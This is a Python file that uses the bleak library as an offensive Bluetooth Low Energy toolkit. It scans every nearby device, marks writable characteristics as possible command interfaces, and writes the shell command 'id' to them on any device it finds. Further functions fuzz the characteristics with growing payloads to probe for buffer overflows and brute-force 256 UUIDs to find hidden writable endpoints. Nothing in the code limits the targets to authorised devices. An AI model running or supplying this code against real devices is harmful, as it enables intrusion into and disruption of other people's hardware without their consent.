import asyncio
from bleak import BleakScanner, BleakClient

def is_potential_shell_characteristic(characteristic):
    """
    Determines if a characteristic might be a command interface based on its properties.
    """
    return ("write" in characteristic.properties or 
            "write_without_response" in characteristic.properties)

async def scan_nearby_devices():
    """
    Scan for all nearby BLE devices and return a list of devices with exploitable services.
    """
    devices = await BleakScanner.discover()
    vulnerable_devices = []
    for device in devices:
        exploitable_services = await scan_and_identify_exploitable_services(device.address)
        if exploitable_services:
            vulnerable_devices.append({
                "device_name": device.name,
                "device_address": device.address,
                "exploitable_services": exploitable_services
            })
    return vulnerable_devices

async def scan_and_identify_exploitable_services(device_address):
    """
    Scan a BLE device for writable characteristics that may allow command execution.
    """
    exploitable_services = []
    try:
        async with BleakClient(device_address) as client:
            print("Scanning device", device_address)
            services = await client.get_services()
            for service in services:
                for char in service.characteristics:
                    if is_potential_shell_characteristic(char):
                        exploitable_services.append({
                            "service_uuid": service.uuid,
                            "char_uuid": char.uuid,
                            "properties": char.properties
                        })
    except Exception as e:
        print(f"Error scanning {device_address}: {e}")
    return exploitable_services

async def exploit_device(device_address, char_uuid):
    """
    Attempt to send shell-like commands to a writable characteristic.
    """
    try:
        async with BleakClient(device_address) as client:
            await client.write_gatt_char(char_uuid, b'id\n')  # Test command
            print(f"Sent test command to {char_uuid}")
            response = await client.read_gatt_char(char_uuid)
            decoded = response.decode(errors='ignore')
            print(f"Response: {decoded}")
            return decoded
    except Exception as e:
        print(f"Failed to write to {char_uuid}: {e}")
        return None

async def run_scan_async(mode, device_address=None):
    """
    Asynchronous version of run_scan.
    For a full scan, returns all vulnerable devices.
    For a specific device, returns exploit results.
    """
    if mode == "scan_all":
        return await scan_nearby_devices()
    elif mode == "scan_specific" and device_address:
        exploitable_services = await scan_and_identify_exploitable_services(device_address)
        results = []
        if exploitable_services:
            for service in exploitable_services:
                response = await exploit_device(device_address, service['char_uuid'])
                results.append({
                    "service_uuid": service['service_uuid'],
                    "char_uuid": service['char_uuid'],
                    "response": response
                })
        return results
    else:
        print("Invalid mode or missing device address.")
        return []

def run_scan(mode, device_address=None):
    """
    Synchronous wrapper for scanning (for standalone usage).
    """
    return asyncio.run(run_scan_async(mode, device_address))

def run_exploit(device_address):
    """
    Synchronous wrapper for exploitation (for standalone usage).
    """
    return asyncio.run(run_scan_async("scan_specific", device_address))

# ---------------- Vulnerability Test Functions ----------------
async def test_overflow(device_address, char_uuid):
    """
    Test for a buffer overflow vulnerability by sending increasingly large payloads.
    """
    for size in [16, 32, 64, 128, 256, 512, 1024]:
        try:
            payload = b"A" * size
            async with BleakClient(device_address) as client:
                await client.write_gatt_char(char_uuid, payload)
                print(f"Sent {size} bytes to {char_uuid}")
        except Exception as e:
            print(f"Overflow test failed at {size} bytes: {e}")
            break

async def test_input_limits(device_address, char_uuid):
    """
    Test different input types to identify input length limits.
    """
    test_strings = ["A" * 10, "A" * 50, "!" * 100, "1234567890" * 10]
    async with BleakClient(device_address) as client:
        for test in test_strings:
            await client.write_gatt_char(char_uuid, test.encode())
            print(f"Sent test input to {char_uuid}: {test[:10]}...")

async def enumerate_uuids(device_address):
    """
    Try a range of UUID variations to discover hidden characteristics.
    """
    base_uuid = "0000abcd-0000-1000-8000-00805f9b34fb"
    similar_uuids = [base_uuid[:-2] + f"{i:02x}" for i in range(256)]
    async with BleakClient(device_address) as client:
        for uuid in similar_uuids:
            try:
                await client.write_gatt_char(uuid, b"test")
                print(f"Writable UUID found: {uuid}")
            except Exception:
                pass
